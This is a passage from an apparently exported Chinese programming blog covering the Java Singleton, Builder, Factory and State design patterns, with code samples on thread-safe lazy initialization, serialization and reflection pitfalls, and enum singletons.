Singleton ()&#123;&#125; public static Singleton getSingleton() &#123; if (instance == null) &#123; synchronized (Singleton.class) &#123; if (instance == null) &#123; instance = new Singleton(); &#125; &#125; &#125; return instance; &#125; &#125; 使用 volatile 有两个功用： 1）这个变量不会在多个线程中存在复本，直接从内存读取。 2）这个关键字会禁止指令重排序优化。也就是说，在 volatile 变量的赋值操作后面会有一个内存屏障（生成的汇编代码上），读操作不会被重排序到内存屏障之前。 下面一个程序用来尝试证明我的想法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475public class SingletonTest &#123; /** * 使用volatile防止指令重排序的问题（singletonTest = new SingletonTest();） * 不加volatile关键字也没有测试出来问题！！！！！ */ public static SingletonTest singletonTest; private int a; private SingletonTest() &#123; a = 1; &#125; /** * synchronized双重锁机制 */ public static SingletonTest getInstance() &#123; if (singletonTest == null) &#123; synchronized (SingletonTest.class) &#123; if (singletonTest == null) &#123; /* * new操作非原子操作，分为3步： * 1.为singletonTest分配分配内存 * 2.调用SingletonTest的构造函数初始化成员变量 * 3.将singletonTest指向分配的内存空间（执行完此步骤singletonTest对象就非null了） * 若不加volatile关键字，2、3两步执行顺序不确定。按照1-3-2的顺序执行则可能会return未初始化的对象 * 时间 线程1 线程2 * t1 1 * t2 3 * t3 外层if (singletonTest == null)成立，直接return 未初始化的对象; * t4 2 */ singletonTest = new SingletonTest(); &#125; &#125; &#125; return singletonTest; &#125; /** * 测试函数 */ public int getA() &#123; return a; &#125; /** * 启动1000个线程测试 */ public static void main(String[] args) throws InterruptedException &#123; for (int j = 0; j &lt; 10; j++) &#123; Thread[] threads = new Thread[10000]; CountDownLatch countDown = new CountDownLatch(10000); for (int i = 0; i &lt; threads.length; i++) &#123; threads[i] = new Thread(new Runnable() &#123; @Override public void run() &#123; countDown.countDown(); SingletonTest instance = SingletonTest.getInstance(); if (instance.getA() != 1) &#123; System.err.println(\"error\"); &#125; &#125; &#125;); &#125; for (int i = 0; i &lt; threads.length; i++) &#123; threads[i].start(); &#125; Thread.sleep(1000); SingletonTest.singletonTest = null; SingletonTest s = SingletonTest.singletonTest; &#125; &#125;&#125; 但是特别注意，在 Java 5 以前Java的版本中，如果使用 volatile 的双检锁还是会出现问题的。其原因是 Java 5 以前的 JMM （Java 内存模型）是存在缺陷的，即时将变量声明成 volatile 也不能完全避免重排序，主要是 volatile 变量前后的代码仍然存在重排序问题。这个 volatile 屏蔽重排序的问题在 Java 5 中才得以修复，所以在这之后才可以放心使用 volatile。 存疑个人认为，其实不需要加 volatile 关键字，也是能够保证这个单例模式的正确性的。 原因在于，synchronized不仅能够保证原子性，同时保证可见性和有序性。即在结束synchronized代码块时，会把在synchronized代码块中进行的所有修改操作同步到主存中。 换句话说，只要在synchronized代码块中进行修改的变量，都隐式地声明为了volatile变量。 饿汉式单例类 static final field这种方法非常简单，因为单例的实例被声明成 static 和 final 变量了，在Singleton类被第一次加载到内存中时，instance实例就会被初始化，所以创建实例本身是线程安全的。 12345678910public class Singleton&#123; //类加载时就初始化 private static final Singleton instance = new Singleton(); private Singleton()&#123;&#125; public static Singleton getInstance()&#123; return instance; &#125;&#125; private static final Singleton instance的声明和private的Singleton构造函数保证了当Singleton类被加载时，instance引用对象被赋值（而且只有这一次赋值机会）。 这种写法比较完美的话，唯一的缺点是它不是一种懒加载模式（lazy initialization），单例会在加载类后一开始就被初始化，即使客户端没有调用 getInstance()方法。饿汉式的创建方式在一些场景中将无法使用：譬如 Singleton 实例的创建是依赖参数或者配置文件的，在 getInstance() 之前必须调用某个方法设置参数给它，那样这种单例写法就无法使用了。 静态内部类 static nested class我比较倾向于使用静态内部类的方法，这种方法也是《Effective Java》第一版中所推荐的。 123456789public class Singleton &#123; private static class SingletonHolder &#123; private static final Singleton INSTANCE = new Singleton(); &#125; private Singleton ()&#123;&#125; public static final Singleton getInstance() &#123; return SingletonHolder.INSTANCE; &#125; &#125; 这种写法仍然通过JVM本身的类加载机制来保证线程安全。 分析1 由于 SingletonHolder 是私有的，除了 getInstance() 之外没有办法访问到它，因此它是懒加载的（lazy initialization）；同时读取实例的时候不会进行同步，没有性能缺陷；也不依赖 JDK 版本。 从外部无法访问静态内部类SingletonHolder，只有当调用Singleton.getInstance方法的时候，才能得到单例对象INSTANCE。 INSTANCE对象初始化的时机，并不是在单例类Singleton被加载的时候，而是在第一次调用Singleton.getInstances()方法的时候，这个调用使得静态内部类SingletonHolder被加载，且此时INSTANCE引用对象被幅值。因此，这种实现方式是利用Classloader的加载机制来实现懒加载，并保证构建单例的线程安全。 分析2不知道你有没有注意到，上面的三种实现方法都包含了一个private的构造函数。因此，我们是不是就能保证无法创建多个类的实例了呢？ 答案是否定的，即我们仍然有其他的高阶方法来创建多个类的实施，以破解单例模式。 序列化（serialization）/反序列化（deserializations） 反射（reflection） 序列化（serialization）/反序列化（deserializations）问题序列化可能会破坏单例模式。 通过比较一个序列化后的对象实例和其被反序列化后的对象实例，我们发现他们不是同一个对象，换句话说，在反序列化时会创建一个新的实例（即使定义构造函数为private）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class Example &#123; public static void main(String[] args) &#123; Singleton singleton = Singleton.getInstance(); singleton.setValue(1); // Serialize try &#123; FileOutputStream fileOut = new FileOutputStream(\"out.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(singleton); out.close(); fileOut.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; singleton.setValue(2); // Deserialize Singleton singleton2 = null; try &#123; FileInputStream fileIn = new FileInputStream(\"out.ser\"); ObjectInputStream in = new ObjectInputStream(fileIn); singleton2 = (Singleton) in.readObject(); in.close(); fileIn.close(); &#125; catch (IOException i) &#123; i.printStackTrace(); &#125; catch (ClassNotFoundException c) &#123; System.out.println(\"singletons.SingletonEnum class not found\"); c.printStackTrace(); &#125; if (singleton == singleton2) &#123; System.out.println(\"Two objects are same\"); &#125; else &#123; System.out.println(\"Two objects are not same\"); &#125; System.out.println(singleton.getValue()); System.out.println(singleton2.getValue()); &#125;&#125;// 我们这里只是以 饿汉式 static final field的实现为例，但上面三种实现都有类似的问题class Singleton implements java.io.Serializable &#123; //类加载时就初始化 private static final Singleton instance = new Singleton(); private int value; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; return instance; &#125; public int getValue() &#123; return value; &#125; public void setValue(int i) &#123; value = i; &#125;&#125; 结果： 123Two objects are not same21 反射（reflection）类似地，使用反射（reflection）可以强行调用私有构造器。 1234567891011121314151617public static void main(String[] args) throws Exception &#123; Singleton singleton = Singleton.INSTANCE; Constructor constructor = singleton.getClass().getDeclaredConstructor(new Class[0]); constructor.setAccessible(true); Singleton singleton2 = (Singleton) constructor.newInstance(); if (singleton == singleton2) &#123; System.out.println(\"Two objects are same\"); &#125; else &#123; System.out.println(\"Two objects are not same\"); &#125; singleton.setValue(1); singleton2.setValue(2); System.out.println(singleton.getValue()); System.out.println(singleton2.getValue());&#125; 结果： 123Two objects are not same12 解决对于序列化时破坏单例模式的问题，我们虽然可以通过以下方式来避免： 123456789101112//测试例子(四种写解决方式雷同)public class Singleton implements java.io.Serializable &#123; public static Singleton INSTANCE = new Singleton(); protected Singleton() &#123; &#125; //反序列时直接返回当前INSTANCE private Object readResolve() &#123; return INSTANCE; &#125; &#125; 因为，在反序列化过程中，如果被序列化的类中定义了readResolve 方法，虚拟机会试图调用对象类里的 readResolve 方法，以进行用户自定义的反序列化。 最终，实现了在序列化/反序列化过程中也不破坏单例模式。 类似地，对于反射时破坏单例模式的问题，我们虽然也可以通过以下方式来避免： 123456789public static Singleton INSTANCE = new Singleton(); private static volatile boolean flag = true;private Singleton()&#123; if(flag)&#123; flag = false; &#125;else&#123; throw new RuntimeException(\"The instance already exists ！\"); &#125;&#125; 但是，问题确实也得到了解决，但这样的解决方案使得代码并不优美。 那有没有更简单更高效的呢？当然是有的，那就是枚举单例了。 枚举 Enum用枚举写单例实在太简单了！这也是它最大的优点。下面这段代码就是声明枚举实例的通常做法。 123456789101112public enum SingletonEnum &#123; INSTANCE; int value; public int getValue() &#123; return value; &#125; public void setValue(int value) &#123; this.value = value; &#125;&#125; 调用12345678public class EnumDemo &#123; public static void main(String[] args) &#123; SingletonEnum singleton = SingletonEnum.INSTANCE; System.out.println(singleton.getValue()); singleton.setValue(2); System.out.println(singleton.getValue()); &#125;&#125; 我们可以通过EasySingleton.INSTANCE来访问实例，这比调用getInstance()方法简单多了。 由于默认枚举实例的创建是线程安全的，所以不需要担心线程安全的问题。但是在枚举中的其他任何方法的线程安全由程序员自己负责。还有防止上面的通过反射机制调用私用构造器。 这个版本基本上消除了绝大多数的问题。代码也非常简单，实在无法不用。这也是新版的《Effective Java》中推荐的模式。 分析事实上，一个 enum类型是一个特殊的class类型。一个enum声明（declaration）实际上会被编译成这样： 12345678910111213final class SingletonEnum extends Enum&#123; ... public static final SingletonEnum INSTANCE; static &#123; INSTANCE = new SingletonEnum(\"INSTANCE\", 0); $VALUES = (new SingletonEnum[] &#123; INSTANCE &#125;); &#125;&#125; 当你的代码第一次访问SingletonEnum.INSTANCE时，SingletonEnum会被JVM加载并且初始化。 总结以实例实例化的时间作为区分，可分为加载时实例化（Early Instantiation）和懒实例化（Lazy Instantiation）： 加载时实例化（Early Instantiation）：在整个系统开始运行时，就进行对象的实例化 懒实例化（Lazy Instantiation）：直到该对象被第一次访问时，才进行实例化 6 优点 由于在系统内存中只存在一个对象，因此可以节约系统资源，对于一些需要频繁创建和销毁的对象，单例模式无疑可以提高系统的性能 7 缺点 单例类的职责过重，在一定程度上违背了“单一职责原则”（Single Responsibility Principle）。因为单例类既充当了工厂角色（提供一个静态的公共方法以允许任何对象访问这个实例，即工厂方法），同时又充当了产品角色（即包含一些属于非静态的业务方法），最终将产品的创建和产品的本身的功能融合到一起。 滥用单例将带来一些负面问题，如为了节省资源将数据库连接池对象设计为单例类，可能会导致共享连接池对象的程序过多而出现连接池溢出。 8 适用场景在以下场景下可以考虑使用单例模式： 在整个系统中，只能存在一个实例对象，如资源消耗较大的对象、配置管理类等； 在整个系统中，要求一个类只有一个实例。 9 模式应用打印池在操作系统中，打印池（Print Spooler）是一个用于管理打印任务的应用程序，通过打印池用户可以删除、中止或者改变打印任务的优先级，在一个系统中只允许运行一个打印池对象，如果重复创建打印池则抛出异常。 因此可使用单例模式来实现打印池。 ID生成器在一个系统中，我们可能会使用到一个ID生成器，比如订单系统。我们需要保证其生成的每一个ID都是唯一且不会重复的。 为此，我们可以把这个IdGenerator设计成一个单例模式。 ConfigManager对于一个系统而言，通常我们可能会设置一个配置管理中心，以管理一些对该系统的全局设置。 为此，我们可以把这个ConfigManager设计成一个单例模式，以保证这些设置都是全局唯一的，而不会出现一个设置项，在一个系统中，有两个不同的值的情况。 Reference 《Effective Java》 《Java与模式》 Stacktips – Adapter Design Pattern In Java - http://stacktips.com/tutorials/design-patterns/adapter-design-pattern-in-java Graphic Design Pattern - 单例模式 - http://design-patterns.readthedocs.io/zh_CN/latest/creational_patterns/singleton.html 深入浅出单实例SINGLETON设计模式 - https://coolshell.cn/articles/265.html javatpoint - Singleton design pattern in Java - https://www.javatpoint.com/singleton-design-pattern-in-java 如何正确地写出单例模式 - http://wuchong.me/blog/2014/08/28/how-to-correctly-write-singleton-pattern/#stq=&amp;stp=1 单例模式中volatile、synchronized指令重排序问题的一点疑问？ - https://www.zhihu.com/question/265419026 漫画：什么是单例模式？ - https://juejin.im/post/5a61a6856fb9a01c9b6605b6 Why Enum Singleton are better in Java - https://javarevisited.blogspot.com/2012/07/why-enum-singleton-are-better-in-java.html Java Singletons Using Enum - https://dzone.com/articles/java-singletons-using-enum Implementing Singleton with an Enum (in Java) - https://stackoverflow.com/questions/26285520/implementing-singleton-with-an-enum-in-javas 深入理解Java枚举类型(enum) - https://blog.csdn.net/javazejian/article/details/71333103","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】创建类模式 -- 建造者模式 (Builder Pattern)","date":"2018-11-11T13:45:53.000Z","path":"2018/11/11/【Design-Pattern】创建类模式-建造者模式-Builder-Pattern/","text":"动机无论在现实世界还是软件系统中，都存在一些复杂的对象，它们拥有多个组成部分。比如汽车，它包括变速箱、发动机、轮毅等各种部件。 而对于大多数用户而言，当使用汽车时，无须了解这些部件的生产细节，而将汽车作为一个整体来使用。有时，汽车的制造商允许用户指定某些部件的型号，以提供定制化服务。 在软件开发中，也存在大量类似汽车的复杂对象，它们拥有一系列成员属性。在这些复杂对象初始化中，可能存在一些限制条件，如： 在某些属性被赋值之前，复杂对象不能作为一个完整的产品被使用 部分属性的赋值必须按照某个指定的顺序，如在某个属性被赋值之前，另一个属性可能无法赋值 部分属性是必须的（Mandatory），而部分属性是可选的（Optional） 但是对于调用者来说，在它们对复杂对象进行初始化时，调用者并不想了解复杂对象的这些内部细节（等同于用户不想知道汽车的某个组件的工作原理），只希望以最简单的方式完成该复合对象的初始化（等同于用户在定制化汽车时，只需要指定坐垫材质、发动机排量等简单的参数即可）。 复杂对象相当于一辆有待组组合的汽车，而对象的属性相当于汽车的部件，初始化对象的过程就相当于选择汽车部件的过程。当对象初始化完成后，就可以得到一个可以被调用的对象实例；相当于当汽车组件组合完成后，汽车就可以被使用了。 由于对复合对象进行初始化（组合部件）的过程较复杂。为了方便调用者，复合对象的初始化（部件的组合）过程往往被“外部化”到一个称作建造者的对象（Builder）里。 从而，用户只需要调用建造者对象中暴露的指定接口（并传入参数），即可完成部件组合过程。最终，建造者对象返回给调用者的是一个已经建造完毕的完整产品对象。这就是建造者模式的模式动机。 简单来说，对于初始化过程较复杂（需为其属性赋值，且还需要遵循一定的约定）的对象，可以采用建造者模式，以为调用者简化初始化过程。 定义建造者模式（Builder Pattern）将一个复杂对象的构建与它的表示分离，使得同样的构建过程（但传入的参数不同）可以创建不同的表示。 构成 抽象建造者（Builder）：可以是一个接口或抽象类，声明了复杂对象产品中各个零件的装配方法； 具体建造者（Concrete Builder）：实现了Builder接口，具体来实现产品中各个组件的具体装配方法，同时提供一个方法（getResult()）以返回创建好的复杂产品对象； 导演者（Director）：负责定义复杂对象产品中零件的装配顺序，以完成对复杂对象的组装； 复杂对象产品（Product）：被构建的复杂对象，包含多个组成部件，具体建造者负责创建该产品，并定义它的组装过程。 一般来说，复杂对象产品（Product）中包含的零件是数目与抽象建造者接口中声明的复杂对象产品中各个零件的装配方法的数目相符。 而且， 导演者角色是与客户端打交道的角色。导演者角色将客户端创建产品的请求划分为对各个零件的构造请求，再将这些请求委派给具体建造者角色。具体建造者角色是做具体建造工作的，但是却不为客户端所知。 UML图 导演者类（Director）1234567891011class Director&#123; private AbstractBuilder builder; public Product construct(AbstractBuilder builder) &#123; this.builder = builder; this.builder.buildPartA(); this.builder.buildPartb(); this.builder.buildPartc(); return this.builder.getResult(); &#125; &#125; 抽象建造者类（Builder）123456abstract class AbstractBuilder&#123; public abstract void buildPartA(); public abstract void buildPartB(); public abstract void buildPartC(); public abstract Product getResult(); &#125; 具体建造者类（Concrete Builder）12345678910111213141516171819class ConcreteBuilder extends AbstractBuilder&#123; private Product product; public ConcreteBuilder()&#123; this.product = new ConcreteProductA(); &#125; public void buildPartA() &#123; ... &#125; public void buildPartB() &#123; ... &#125; public void buildPartC() &#123; ... &#125; public Product getResult() &#123; return this.product; &#125; &#125; 测试类12345678public class Client &#123; public static void main(String[] args) &#123; AbstractBuilder builder = new ConcreteBuilder(); Director director = new Director(builder); Product p = director.construct(); &#125;&#125; 示例以去肯德基点餐为例，我们需要选择三明治、辅菜（比如薯条、炸鸡翅），选择饮料等等，以生成所谓的“套餐”： MealBuilder接口声明了装配产品（准备一顿饭）所需要的各个方法 SandwichMealBuilder类实现了MealBuilder接口 MealDirector类中根据准备这顿饭的指定步骤，调用了指定方法（选择三明治、增加辅菜，选择饮料等等） Meal类表示装配产品（一顿饭） UML图实现思路Meal.java12345678910111213public class Meal &#123; public String sandwich; public String sideOrder; public String drink; public String offer; public double price; @Override public String toString() &#123; return \"Sandwich=\" + sandwich + \" Side Order=\" + sideOrder + \" Drink=\" + drink + \" Offer=\" + offer + \" Price=\" + price; &#125;&#125; MealBuilder.java12345678public interface MealBuilder &#123; public abstract void addSandwich(String sandwich); public abstract void addSides(String sides); public abstract void addDrink(String drink); public abstract void addOffer(String coupon); public abstract void setPrice(double price); public abstract Meal getMeal();&#125; SandwichMealBuilder.java123456789101112131415161718192021222324252627282930313233public class SandwichMealBuilder implements MealBuilder &#123; private Meal _meal = new Meal(); @Override public void addSandwich(String sandwich) &#123; _meal.sandwich = sandwich; &#125; @Override public void addSides(String sides) &#123; _meal.sideOrder = sides; &#125; @Override public void addDrink(String drink) &#123; _meal.drink = drink; &#125; @Override public void addOffer(String coupon) &#123; _meal.offer = coupon; &#125; @Override public void setPrice(double price) &#123; _meal.price = price; &#125; @Override public Meal getMeal() &#123; return _meal; &#125;&#125; MealDirector.java12345678910111213141516public class MealDirector &#123; MealBuilder mealBuilder; public MealDirector(MealBuilder mealBuilder)&#123; this.mealBuilder = mealBuilder; &#125; public Meal makeMeal(String sandwich, String sides, String drink, String offer) &#123; mealBuilder.addSandwich(sandwich); mealBuilder.addSides(sides); mealBuilder.addDrink(drink); mealBuilder.addOffer(offer); mealBuilder.setPrice(5.99); return this.mealBuilder.getMeal(); &#125;&#125; Client.java123456789public class Client &#123; public static void main(String[] args) &#123; MealBuilder sandwichBuilder = new SandwichMealBuilder(); MealDirector director = new MealDirector(sandwichBuilder); Meal meal = director.makeMeal(\"Hamburger\", \"Fries\", \"Coke\", \"Weekend Bonanza\"); System.out.println(meal.toString()); &#125;&#125; 适用环境在以下情况下可以使用建造者模式： 需要生成的产品对象有复杂的内部结构，这些产品对象通常包含多个成员属性 需要生成的产品对象的属性相互依赖，需要指定其生成顺序 对象的创建过程独立于创建该对象的类。在建造者模式中引入了指挥者类，将创建过程封装在指挥者类中，而不在建造者类中 隔离复杂对象的创建和使用，并使得相同的创建过程可以创建不同的产品 优缺点优点 调用者不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦 增加新的具体建造者无须修改原有类库的代码，指挥者类针对抽象建造者类编程，系统扩展方便，符合“开闭原则” 缺点 建造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，则不适合使用建造者模式，因此其使用范围受到一定的限制 如果产品的内部变化复杂，可能会导致需要定义很多具体建造者类来实现这种变化，导致系统变得很庞大 分析建造者模式过渡到模板方法模式准备一个抽象类，将部分逻辑以具体方法以及具体构造函数的形式实现，然后声明一些抽象方法来迫使子类实现剩余的逻辑。 不同的子类可以以不同的方式实现这些抽象方法，从而对剩余的逻辑有不同的实现。这就是模板方法模式。 有意思的是，这个特殊的建造模式与模板方法有相似之处：construct()方法就相当于一个模板方法，这个方法调用其他的建造方法，如 buildPart1()、buildPart2()等基本方法。 因此，这使得此系统与模板方法模式相同。 建造者模式与工厂模式区别我们可以看到，建造者模式与工厂模式是极为相似的，总体上，建造者模式仅仅只比工厂模式多了一个“导演类”的角色。在建造者模式的类图中，假如把这个导演类看做是最终调用的客户端，那么图中剩余的部分就可以看作是一个简单的工厂模式了。 与工厂模式相比，建造者模式一般用来创建更为复杂的对象，因为对象的创建过程更为复杂，因此将对象的创建过程独立出来组成一个新的类——导演类。也就是说，工厂模式是将对象的全部创建过程封装在工厂类中，由工厂类向客户端提供最终的产品；而建造者模式中，建造者类一般只提供产品类中各个组件的建造，而将具体建造过程交付给导演类。由导演类负责将各个组件按照特定的规则组建为产品，然后将组建好的产品交付给客户端。 Reference 《Java与模式》 Stacktips - Builder Design Pattern In Java Graphic Design Patterns - 建造者模式 What is the difference between Builder Design pattern and Factory Design pattern? DZONE - Design Patterns: The Builder Pattern","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】创建类模式 -- 工厂模式 (Factory Pattern）","date":"2018-11-11T13:44:37.000Z","path":"2018/11/11/【Design-Pattern】创建类模式-工厂模式-Factory-Pattern）/","text":"工厂模式具体包括三种： 简单工厂模式（Simple Factory Pattern）/静态工厂方法模式（Static Factory Method Pattern） 工厂方法模式（Factory Method Pattern） 抽象工厂模式（Abstruct Factory Pattern） 1 简单工厂模式（Simple Factory Pattern）/静态工厂方法模式（Static Factory Method Pattern）定义简单工厂模式（Simple Factory Pattern)，又称为静态工厂方法模式（Static Factory Method Pattern），它属于创建式模式。 在简单工厂模式中，包含一个工厂类，在这个工厂类中，包含一个静态方法；在调用该静态方法时，需要传入一个参数，这个参数标识了我们具体需要哪一种产品类。 客户端在调用了这个静态方法后，将返回一个被指定的产品类的实例。 组成 简单工厂模式包含如下角色： Product（抽象产品角色）：抽象产品角色是所创建的所有对象的父类，负责描述所有实例所共有的公共接口 ConcreteProduct（具体产品角色）：具体产品角色是创建目标，所有创建的对象都充当这个角色的某个具体类的实例。 Factory（工厂角色）：工厂角色负责实现创建所有实例的内部逻辑例子 比如，一个软件系统提供多个外观不同的按钮（如圆形按钮、方形按钮），这些按钮都继承于同一个基类（称为按钮类）。在继承基类之后，各个按钮类通过修改基类的属性，从而实现显示出不同的形状。 当我们需要使用到某一个具体的按钮对象（如圆形按钮）时，仅需调用一个生成具体按钮对象的静态方法，并传入标识该具体按钮类的参数（如一个枚举值，ButtonType.RoundButton），即可得到这个具体按钮类的实例。 抽象按钮类123abstract class Button &#123; public abstract void draw();&#125; 圆形按钮类12345class RoundButton extends Button &#123; public void draw() &#123; // draw round button &#125;&#125; 方形按钮类12345class SquareButton extends Button &#123; public void draw() &#123; // draw square button &#125;&#125; 枚举1234enum ButtonType &#123; RoundButton, SquareButton&#125; 按钮工厂类123456789101112class ButtonFactory &#123; public static Button CreateButton(ButtonType buttonType) &#123; switch (buttonType) &#123; case ButtonType.RoundButton: return new RoundButton(); case ButtonType.SquareButton: return new SquareButton(); default: return null; &#125; &#125;&#125; 调用12345678class Program &#123; static void main(string[] args) &#123; Button button = ButtonFactory.CreateButton(ButtonType.RoundButton); if (button != null) &#123; button.draw(); &#125; &#125;&#125; 应用场景在真实的系统中，产品可以形成复杂的等级结构，比如下图所示的树形结构上就有许多抽象产品类和具体产品类。如下图： 这个时候，简单工厂模式采取的是同一使用同一个工厂类，来处理同一产品类（抽象）。如下图： 这样做的好处是设计简单，产品类的等级结构不过反映到工厂类中来，从而产品类的等级结构的变化也不会影响工厂类。但这样做的缺点是，增加新的产品必将导致工厂类的修改。 优缺点优点 对调用者来说，获得一个具体产品对象非常简单。当需要一个圆形按钮对象时，只需要传入一个圆形按钮标识参数，即可获得一个圆形按钮对象，而无需了解其创建细节； 去除了调用者对具体产品类的依赖（即调用者并不需要与RoundButton类产生耦合，本质上，是利用了面向对象的多态特性）。 缺点 简单工厂模式最大的问题在于工厂类的职责相对较重，工厂类中的方法逻辑较为复杂； 而且，当每增加一种具体产品时，就要修改工厂类中方法中的判断逻辑，这一修改违反了 SOLID 原则中的开闭原则（The Open Closed Principle）。 2 工厂方法模式（Factory Method Pattern）背景由于一个工厂类负责所有产品的创建，增加新的产品必将导致工厂类的修改，将必要的逻辑加入到工厂类中。因此，简单工厂模式（Simple Factory Pattern）的缺点是违反了开闭原则（The Open Closed Principle）。 现在对该实现进行改进，不再设计一个按钮工厂类来统一负责所有具体按钮产品的实例创建，而是将具体按钮产品的实例创建交给专门的工厂子类（每个具体的按钮产品都有一个对应的工厂类）去完成。 我们先定义一个抽象的按钮工厂类，再定义具体的工厂类来生成【圆形按钮】、【矩形按钮】、【菱形按钮】等，分别称为【圆形按钮工厂】、【矩形按钮工厂】、【菱形按钮工厂】，它们均实现在抽象按钮工厂类中定义的方法。 这种抽象化的结果使这种结构可以在不修改具体工厂类的情况下引进新的产品，如果出现新的按钮类型，只需要为这种新类型的按钮创建一个具体的工厂类就可以获得该新按钮的实例，这一特点无疑使得工厂方法模式比简单工厂模式更具有良好的扩展性，同时完全符合开闭原则（The Open Closed Principle）。。 定义工厂方法模式（Factory Method Pattern）又称为工厂模式，它属于类创建型模式。 在工厂方法模式中，工厂父类负责定义创建产品对象的公共接口，而工厂子类则负责生成具体的产品对象，这样做的目的是将产品类的实例化操作延迟到工厂子类中完成，即通过工厂子类来确定究竟应该实例化哪一个具体产品类。 组成 工厂方法模式包含如下角色： 抽象产品（Abstract Product） 具体产品（Concrete Product） 抽象工厂（Abstract Factory） 具体工厂（Concrete Factory） 例子产品接口12public interface Product &#123;&#125; 具体产品类12public class ConcreteProduct1 implements Product &#123;&#125; 工厂接口1234public interface Creator &#123; //工厂方法 public Product factory();&#125; 具体工厂类123456public class ConcreteCreator1 implements Creator &#123; public Product factory() &#123;//实现工厂方法 return new ConcreteProduct1(); &#125;&#125; 调用123456789101112public class Client &#123; private static Creator creator1, creator2; private static Product prod1, prod2; public static void main(String[] args) &#123; creator1 = new ConcreteCreator1(); prod1 = creator1.factory(); creator2 = new ConcreteCreator2(); prod2 = creator2.factory(); &#125;&#125; 优缺点优点 在工厂方法模式中，工厂方法用来创建客户所需要的产品，同时还向客户隐藏了哪种具体产品类将被实例化这一细节，用户只需要关心所需产品对应的工厂，无须关心创建细节，甚至无须知道具体产品类的类名。 在系统中加入新产品时，无须修改抽象工厂和抽象产品提供的接口，也无须修改现有的具体工厂和具体产品，而只要添加一个新的具体工厂和新的具体产品即可。这样，系统的可扩展性增强了，完全符合“开闭原则”。 缺点 在添加新产品时，需要编写新的具体产品类，而且还要提供与之对应的具体工厂类，系统中类的个数将成对增加，在一定程度上增加了系统的复杂度 3 抽象工厂模式（Abstruct Factory Pattern）抽象工厂模式是所有形态的工厂模式中最为抽象和最具一般性的一种形态。 在工厂方法模式中，一个具体的工厂类负责生产具体的产品，每一个具体工厂对应一种具体产品。一般情况下，一个具体工厂类中只有一个工厂方法。 但是有时候，我们需要一个工厂可以提供多个创建不同具体产品对象的方法。 当需要一个工程不仅仅只提供某一个具体产品（而是可提供多个具体产品）时，就需要使用抽象工厂模式。 产品等级结构、产品族的概念产品等级结构：属于同一抽象产品下的所有产品组成了一个产品等级结构，比如像下图中的Button、Text就是二个产品等级结构。 所谓产品族，是指位于不同产品等级结构中，功能相关联的产品组成的家族，比如下图中的UnixButton、UnixText就是一个产品族，而WinButton、WinText又是另一个产品族。看下图会更清楚一点： 比如Button与Text就是不同的两个产品级结构，而Uinx下Button与Text就组成了Unix下的一个产品族，相似地Windows属于另一产品族。 模式定义抽象工厂模式（Abstract Factory Pattern）：提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类，属于对象创建型模式。 模式结构抽象工厂模式包含如下角色： AbstractFactory：抽象工厂 ConcreteFactory：具体工厂 AbstractProduct：抽象产品 Product：具体产品 代码说明12 与工厂方式模式区别工厂方法模式针对的是一个产品等级结构，而抽象工厂模式则需要面对多个产品等级结构。 另外，抽象工厂模式中的工厂等级结构应该像工厂方法模式中的工厂等级结构那样，与产品等级结构是平行的。 Reference 简单工厂模式( Simple Factory Pattern) - http://design-patterns.readthedocs.io/zh_CN/latest/creational_patterns/simple_factory.html#id14 [JAVA设计模式]第二部分：创建模式 - https://www.cnblogs.com/jiangzhengjun/p/4261025.html","comments":true,"categories":[{"name":"DesignPattern","slug":"DesignPattern","permalink":"http://swsmile.info/categories/DesignPattern/"}],"tags":[{"name":"Design Pattern","slug":"Design-Pattern","permalink":"http://swsmile.info/tags/Design-Pattern/"}]},{"title":"【Design Pattern】行为类模式 -- 状态模式 (State Pattern)","date":"2018-11-11T13:42:32.000Z","path":"2018/11/11/【Design-Pattern】行为类模式-状态模式-State-Pattern/","text":"动机 一个对象可能会拥有不同的状态，且可在运行时（runtime）在这几个状态之间切换； 当这个对象与外界交互时，他的状态就可能发生变化，并在不同状态之间切换； 当在状态变化时，对象可表现出不同的行为（以体现状态变化后的影响）。 比如，在一个游戏中，一个游戏角色可处于不同的状态：健康、受伤、死亡： 当处于健康状态时，允许其他角色使用武器对其进行射击； 当被其他角色射击命中时（生命值下降），处于受伤状态； 当生命值下降至0时，处于死亡状态。 同时，当状态变化时，触发相应的行为或逻辑，比如： 当处于受伤状态后，允许通过吃食物来增加生命值（设置一个Boolean值表示是否允许吃食物，并置为True）； 当处于死亡状态后，则不会被攻击（或者说被攻击后，生命值不再下降）。 定义用一句话来表述，状态模式把所研究的对象的行为包装在不同的状态对象里，每一个状态对象都属于一个抽象状态类的一个子类。状态模式的意图是让一个对象在其内部状态改变的时候，其行为也随之改变。 特点 一个对象可拥有不同的状态 可在不同状态之间不断的切换 某一瞬间，只能处于一个特定的唯一状态（而不能同时处于多种状态） 构成 一个状态接口（State Interface） ； 一个或多个具体的状态角色（Concrete State），且实现了状态接口； 状态上下文角色，以允许调用者指定特定的状态； UML图 实现环境角色类123456789101112131415public class Context &#123; //持有一个State类型的对象实例 private State state; public void setState(State state) &#123; this.state = state; &#125; /** * 用户感兴趣的接口方法 */ public void request(String sampleParameter) &#123; //转调state来处理 state.handle(sampleParameter); &#125;&#125; 抽象状态类123456public interface State &#123; /** * 状态对应的处理 */ public void handle(String sampleParameter);&#125; 具体状态类123456public class ConcreteStateA implements State &#123; @Override public void handle(String sampleParameter) &#123; System.out.println(\"ConcreteStateA handle ：\" + sampleParameter); &#125;&#125; 123456public class ConcreteStateB implements State &#123; @Override public void handle(String sampleParameter) &#123; System.out.println(\"ConcreteStateB handle ：\" + sampleParameter); &#125;&#125; 客户端类123456789101112public class 